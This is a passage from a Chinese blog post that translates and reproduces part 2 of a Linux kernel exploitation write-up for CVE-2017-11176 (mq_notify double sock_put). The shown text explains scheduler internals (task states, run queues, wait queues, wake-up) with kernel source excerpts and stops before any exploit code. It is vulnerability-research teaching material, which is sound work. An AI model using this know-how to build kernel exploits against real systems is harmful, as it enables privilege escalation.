<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14.0/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">

<script class="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"sunichi.github.io","root":"/","scheme":"Muse","version":"8.0.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
  </script>

  <meta name="description" content="根据lexfo博客进行的CVE-2017-11176分析和复现（第二部分）。">
<meta property="og:type" content="article">
<meta property="og:title" content="【翻译&amp;复现】CVE-2017-11176分析(2)">
<meta property="og:url" content="https://sunichi.github.io/2019/10/08/CVE-2017-11176-2/index.html">
<meta property="og:site_name" content="Sunichi&#39;s Blog">
<meta property="og:description" content="根据lexfo博客进行的CVE-2017-11176分析和复现（第二部分）。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://github.com/sunichi/hexo_images/blob/master/blog/CVE-2017-11176/2.png?raw=true">
<meta property="article:published_time" content="2019-10-08T13:00:00.000Z">
<meta property="article:modified_time" content="2019-10-08T13:01:28.355Z">
<meta property="article:author" content="sunichi">
<meta property="article:tag" content="kernel">
<meta property="article:tag" content="cve">
<meta property="article:tag" content="vul">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://github.com/sunichi/hexo_images/blob/master/blog/CVE-2017-11176/2.png?raw=true">


<link rel="canonical" href="https://sunichi.github.io/2019/10/08/CVE-2017-11176-2/">


<script class="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>【翻译&复现】CVE-2017-11176分析(2) | Sunichi's Blog</title>
  






  <noscript>
  <style>
  body { margin-top: 2rem; }

  .use-motion .menu-item,
  .use-motion .sidebar,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header {
    visibility: visible;
  }

  .use-motion .header,
  .use-motion .site-brand-container .toggle,
  .use-motion .footer { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle,
  .use-motion .custom-logo-image {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line {
    transform: scaleX(1);
  }

  .search-pop-overlay, .sidebar-nav { display: none; }
  .sidebar-panel { display: block; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">Sunichi's Blog</h1>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">sunichi@DUBHE | Linux & Pwn & Fuzz</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>







</div>
        
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <section class="post-toc-wrap sidebar-panel">
          <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5-2"><span class="nav-number">2.</span> <span class="nav-text">0x01 核心概念 #2</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%BB%E5%8A%A1%E7%8A%B6%E6%80%81"><span class="nav-number">2.1.</span> <span class="nav-text">任务状态</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Run-Queues"><span class="nav-number">2.2.</span> <span class="nav-text">Run Queues</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%98%BB%E5%A1%9E%E4%B8%80%E4%B8%AA%E4%BB%BB%E5%8A%A1%E4%B8%8Eschedule"><span class="nav-number">2.3.</span> <span class="nav-text">阻塞一个任务与schedule()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Wait-Queues"><span class="nav-number">2.4.</span> <span class="nav-text">Wait Queues</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Waking-up-a-task"><span class="nav-number">2.5.</span> <span class="nav-text">Waking up a task</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%80%E4%B8%AA%E5%AE%8C%E6%95%B4%E7%9A%84%E7%A4%BA%E4%BE%8B"><span class="nav-number">2.6.</span> <span class="nav-text">一个完整的示例</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-Unblocking-the-Main-Thread"><span class="nav-number">3.</span> <span class="nav-text">0x02 Unblocking the Main Thread</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8E%A7%E5%88%B6%E5%B9%B6%E8%B5%A2%E5%BE%97%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="nav-number">3.1.</span> <span class="nav-text">控制并赢得条件竞争</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Identify-%E2%80%9Cunblocker%E2%80%9D-candidates"><span class="nav-number">3.2.</span> <span class="nav-text">Identify “unblocker” candidates</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Reaching-wake-up-interruptible-from-setsockopt-syscall"><span class="nav-number">3.3.</span> <span class="nav-text">Reaching wake_up_interruptible() from setsockopt syscall</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Updating-The-Exploit"><span class="nav-number">3.4.</span> <span class="nav-text">Updating The Exploit</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Updating-The-STAP-Script"><span class="nav-number">3.5.</span> <span class="nav-text">Updating The STAP Script</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Making-fget-Fail-on-Second-Loop"><span class="nav-number">4.</span> <span class="nav-text">Making fget() Fail on Second Loop</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88fget-%E4%BC%9A%E8%BF%94%E5%9B%9ENULL"><span class="nav-number">4.1.</span> <span class="nav-text">为什么fget()会返回NULL</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Reset-an-Entry-in-the-File-Descriptor-Table"><span class="nav-number">4.2.</span> <span class="nav-text">Reset an Entry in the File Descriptor Table</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#An-Egg-and-Chicken-Issue%E2%80%A6"><span class="nav-number">4.3.</span> <span class="nav-text">An Egg and Chicken Issue…</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9B%B4%E6%96%B0Exploit"><span class="nav-number">4.4.</span> <span class="nav-text">更新Exploit</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Looping-back-to-%E2%80%9Cretry%E2%80%9D-label"><span class="nav-number">5.</span> <span class="nav-text">Looping back to “retry” label</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Filling-The-Receive-Buffer"><span class="nav-number">5.1.</span> <span class="nav-text">Filling The Receive Buffer</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Lowering-sk-rcvbuf"><span class="nav-number">5.2.</span> <span class="nav-text">Lowering sk_rcvbuf</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Back-to-the-%E2%80%9Cnormal%E2%80%9D-path"><span class="nav-number">5.3.</span> <span class="nav-text">Back to the “normal” path</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#The-netlink-unicast-path"><span class="nav-number">5.4.</span> <span class="nav-text">The netlink_unicast() path</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Reaching-netlink-unicast-from-netlink-sendmsg"><span class="nav-number">5.5.</span> <span class="nav-text">Reaching netlink_unicast() from netlink_sendmsg()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Reach-netlink-attachskb-from-netlink-unicast"><span class="nav-number">5.6.</span> <span class="nav-text">Reach netlink_attachskb() from netlink_unicast()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Binding-the-receiver-socket"><span class="nav-number">5.7.</span> <span class="nav-text">Binding the receiver socket</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Putting-It-All-Together"><span class="nav-number">5.8.</span> <span class="nav-text">Putting It All Together</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Final-Proof-Of-Concept-Code"><span class="nav-number">6.</span> <span class="nav-text">Final Proof-Of-Concept Code</span></a></li></ol></div>
      </section>
      <!--/noindex-->

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">sunichi</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives">
          <span class="site-state-item-count">47</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
        <span class="site-state-item-count">55</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </section>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">
      

      

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://sunichi.github.io/2019/10/08/CVE-2017-11176-2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="sunichi">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sunichi's Blog">
    </span>

    
    
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          【翻译&复现】CVE-2017-11176分析(2)
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2019-10-08 21:00:00 / 修改时间：21:01:28" itemprop="dateCreated datePublished" datetime="2019-10-08T21:00:00+08:00">2019-10-08</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <p>根据lexfo博客进行的CVE-2017-11176分析和复现（第二部分）。</p>
<a id="more"></a>

<p>源自文章：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html">https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part2.html">https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part2.html</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html">https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html">https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html</a></p>
</blockquote>
<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>在<a href="https://sunichi.github.io/2019/07/22/CVE-2017-11176-1/">此前的文章</a>中我们详细分析了CVE-2017-11176（mq_notify: double sock_put()）的原理和相关攻击场景。我们在<em>System Tap</em>的帮助下“强制”在内核态触发并验证了这个bug，并编写了第一个版本的exp。有三个触发bug的条件：</p>
<ol>
<li>强制*netlink_attachskb()*返回1</li>
<li>Unblock exploit thread</li>
<li>强制第二次*fget()*返回NULL</li>
</ol>
<p>在这篇文章中，我们将会尝试不使用<em>System Tap</em>，而是只通过用户态代码来满足上述条件。在本文的结尾，我们将会有能稳定触发bug的poc代码。</p>
<h3 id="0x01-核心概念-2"><a href="#0x01-核心概念-2" class="headerlink" title="0x01 核心概念 #2"></a>0x01 核心概念 #2</h3><p>在核心概念的第二部分将会介绍调度子系统。首先关注的是任务状态和一个任务如何在不同状态间进行转换。注：实际的调度器算法CFS不会在这讨论。主要讨论的是<strong>等待队列</strong>，因为在Unblock thread和获取任意函数调用的时候会用到。</p>
<h4 id="任务状态"><a href="#任务状态" class="headerlink" title="任务状态"></a>任务状态</h4><p>任务的运行状态保存在task_struct的<strong>state</strong>中，一个任务一定是所有状态的其中之一</p>
<ul>
<li><strong>Running</strong>：进程正在CPU上执行或正在等待被运行</li>
<li><strong>Waiting</strong>：进程由于等待事件或资源，处于等待或睡眠状态，</li>
<li>……</li>
</ul>
<p>一个正在运行的任务（<em>TASK_RUNNING</em>）属于<strong>run queue</strong>，它正在被执行或即将被执行。而一个正在等待的任务没有被任何一个CPU执行，它可以在<strong>wait queues</strong>或信号的帮助下被唤醒。正在等待的任务最常见的状态是<em>TASK_INTERRUPTIBLE</em>。</p>
<p>状态被定义在：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// [include/linux/sched.h]</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TASK_RUNNING        0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TASK_INTERRUPTIBLE  1</span></span><br><span class="line"><span class="comment">// ... cut (other states) ...</span></span><br></pre></td></tr></table></figure>

<p><strong>state</strong>可以直接使用或者通过使用current宏的**__set_current_state()**：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// [include/linux/sched.h]</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __set_current_state(state_value)            \</span></span><br><span class="line">    <span class="keyword">do</span> &#123; current-&gt;state = (state_value); &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<h4 id="Run-Queues"><a href="#Run-Queues" class="headerlink" title="Run Queues"></a>Run Queues</h4><p>结构体<strong>rq</strong>是调度器中最重要的数据结构之一，每一个在run queue中的任务都会被CPU执行，每一个CPU拥有自己的run queue（运行真正的多任务）。run queue包含在给定CPU上运行“可选”（由调度器）的任务列表。它还有调度器用于做出“公平”选择的统计信息，并最终重新平衡每个CPU之间的负载（即CPU迁移）。</p>
<p>Run queue包含在给定CPU上运行（由调度程序）“可选”的任务列表。 它还具有调度程序用于做出“公平”选择的统计信息，并最终重新平衡每个CPU之间的负载（即CPU迁移）。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// [kernel/sched.c]</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rq</span> &#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> nr_running;   <span class="comment">// &lt;----- statistics</span></span><br><span class="line">  u64 nr_switches;            <span class="comment">// &lt;----- statistics</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">curr</span>;</span>   <span class="comment">// &lt;----- the current running task on the cpu</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>注：在使用CFS的时候，存储实际任务列表的方式有点复杂，但这并不重要。</p>
<p>为了简单起见，考虑从任何run queue中移出的任务不会被执行（即没有CPU来执行它）。这正是<strong>deactivate_task()**函数的功能，而</strong>activate_task()**功能相反。</p>
<h4 id="阻塞一个任务与schedule"><a href="#阻塞一个任务与schedule" class="headerlink" title="阻塞一个任务与schedule()"></a>阻塞一个任务与schedule()</h4><p>当一个任务想要从running转换成waiting状态时，它需要至少做两件事：</p>
<ol>
<li>设置它的运行状态为<em>TASK_INTERRUPTIBLE</em></li>
<li>唤起**deactivate_task()**将它从run queue中移出</li>
</ol>
<p>实际上，没有人直接调用<strong>deactivate_task()**，而是调用</strong>schedule()<strong>。</strong>schedule()<strong>是调度器的主要函数，当调用它时，必须选择下一个（running）任务在CPU上运行，也就是说必须更新run queue的</strong>curr**字段。</p>
<p>但是，如果在当前任务状态不是running时调用<strong>schedule()**（即其状态与零不同），并且没有信号挂起，则它将调用</strong>deactivate_task()**：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">asmlinkage <span class="keyword">void</span> __sched <span class="title">schedule</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> *switch_count;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">rq</span> *<span class="title">rq</span>;</span></span><br><span class="line">  <span class="keyword">int</span> cpu;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ... cut ...</span></span><br><span class="line"></span><br><span class="line">  prev = rq-&gt;curr;    <span class="comment">// &lt;---- &quot;prev&quot; is the task running on the current CPU</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (prev-&gt;state &amp;&amp; !(preempt_count() &amp; PREEMPT_ACTIVE)) &#123;   <span class="comment">// &lt;----- ignore the &quot;preempt&quot; stuff</span></span><br><span class="line">    <span class="keyword">if</span> (unlikely(signal_pending_state(prev-&gt;state, prev)))</span><br><span class="line">      prev-&gt;state = TASK_RUNNING;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      deactivate_task(rq, prev, DEQUEUE_SLEEP);     <span class="comment">// &lt;----- task is moved out of run queue</span></span><br><span class="line">    switch_count = &amp;prev-&gt;nvcsw;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ... cut (choose the next task) ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后，任务可以通过执行以下代码来阻塞：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">make_it_block</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __set_current_state(TASK_INTERRUPTIBLE);</span><br><span class="line">  schedule();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>任务将会持续阻塞直到有人唤醒它。</p>
<h4 id="Wait-Queues"><a href="#Wait-Queues" class="headerlink" title="Wait Queues"></a>Wait Queues</h4><p>等待资源或特殊事件非常普遍。 例如，如果运行服务器，主线程可能正在等待传入连接。除非它被标记为“非阻塞”，否则accept()系统调用将阻塞主线程。也就是说，主线程被卡在内核中，直到有东西唤醒它。</p>
<p><strong>wait queue</strong>是当前被阻塞进程的双向链表，有的人可能会把它看<strong>run queue</strong>的“对立面”。其本身用<strong>wait_queue_head_t</strong>表示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// [include/linux/wait.h]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> __<span class="title">wait_queue_head</span> <span class="title">wait_queue_head_t</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">wait_queue_head</span> &#123;</span></span><br><span class="line">    <span class="keyword">spinlock_t</span> lock;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">task_list</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>注</strong>：<strong>struct list_head</strong>是Linux实现双向链表的类型。</p>
<p>链表中的元素类型是<strong>wait_queue_t</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// [include/linux.wait.h]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> __<span class="title">wait_queue</span> <span class="title">wait_queue_t</span>;</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*<span class="keyword">wait_queue_func_t</span>)</span><span class="params">(<span class="keyword">wait_queue_t</span> *wait, <span class="keyword">unsigned</span> mode, <span class="keyword">int</span> flags, <span class="keyword">void</span> *key)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">wait_queue</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line">    <span class="keyword">void</span> *<span class="keyword">private</span>;                </span><br><span class="line">    <span class="keyword">wait_queue_func_t</span> func;     <span class="comment">// &lt;----- we will get back to this</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">task_list</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>一个wait queue的元素可以使用宏定义**DECLARE_WAITQUEUE()**创建：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// [include/linux/wait.h]</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __WAITQUEUE_INITIALIZER(name, tsk) &#123;                \</span></span><br><span class="line">    .<span class="keyword">private</span>    = tsk,                      \</span><br><span class="line">    .func       = default_wake_function,            \</span><br><span class="line">    .task_list  = &#123; <span class="literal">NULL</span>, <span class="literal">NULL</span> &#125; &#125;</span><br><span class="line"></span><br><span class="line">#define DECLARE_WAITQUEUE(name, tsk)                    \</span><br><span class="line">    <span class="keyword">wait_queue_t</span> name = __WAITQUEUE_INITIALIZER(name, tsk) <span class="comment">// &lt;----- it creates a variable!</span></span><br></pre></td></tr></table></figure>

<p>调用方式：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DECLARE_WAITQUEUE(my_wait_queue_elt, current); <span class="comment">// &lt;----- use the &quot;current&quot; macro</span></span><br></pre></td></tr></table></figure>

<p>最后，一旦声明了一个wait queue的元素，就可以使用**add_wait_queue()**将其排入wait queue中。它仅将元素添加到双向链表中并使用了锁。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// [kernel/wait.c]</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_wait_queue</span><span class="params">(<span class="keyword">wait_queue_head_t</span> *q, <span class="keyword">wait_queue_t</span> *wait)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line"></span><br><span class="line">    wait-&gt;flags &amp;= ~WQ_FLAG_EXCLUSIVE;</span><br><span class="line">    spin_lock_irqsave(&amp;q-&gt;lock, flags);</span><br><span class="line">    __add_wait_queue(q, wait);              <span class="comment">// &lt;----- here</span></span><br><span class="line">    spin_unlock_irqrestore(&amp;q-&gt;lock, flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> __add_wait_queue(<span class="keyword">wait_queue_head_t</span> *head, <span class="keyword">wait_queue_t</span> *<span class="keyword">new</span>)</span><br><span class="line">&#123;</span><br><span class="line">    list_add(&amp;<span class="keyword">new</span>-&gt;task_list, &amp;head-&gt;task_list);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用**add_wait_queue()**又被称为”registering to a wait queue”。</p>
<h4 id="Waking-up-a-task"><a href="#Waking-up-a-task" class="headerlink" title="Waking up a task"></a>Waking up a task</h4><p>到目前为止，我们知道两种队列：run queues和wait queues。要阻塞一个任务就是使用**deactivate_task()**将其从run queue中删除，但它如何从阻塞（休眠）状态转换回运行状态？</p>
<p><strong>注</strong>：阻塞的任务可以通过信号或其他方式唤醒，但这超出了本次的讨论范围。</p>
<p>由于被阻塞的任务不再运行，因此无法自行唤醒，唤醒工作需要由另一个任务完成。</p>
<p>具有特定资源所有权的数据结构具有wait queue，当任务想要访问此资源但不可用时，改任务可以使自己处于休眠状态，直到资源所有者唤醒为止。为了在资源可用时被唤醒，它必须注册到资源的等待队列。正如我们之前看到的，这个“注册”是通过<strong>add_wait_queue()**完成的。当资源可用时，资源所有者唤醒一个或多个任务，以便它们能够继续执行。这是通过</strong>__wake_up()**完成的。</p>
<p>当资源可用时，所有者唤醒一个或多个任务，以便他们可以继续执行。这是通过__wake_up（）函数完成的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// [kernel/sched.c]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * __wake_up - wake up threads blocked on a waitqueue.</span></span><br><span class="line"><span class="comment"> * @q: the waitqueue</span></span><br><span class="line"><span class="comment"> * @mode: which threads</span></span><br><span class="line"><span class="comment"> * @nr_exclusive: how many wake-one or wake-many threads to wake up</span></span><br><span class="line"><span class="comment"> * @key: is directly passed to the wakeup function</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span 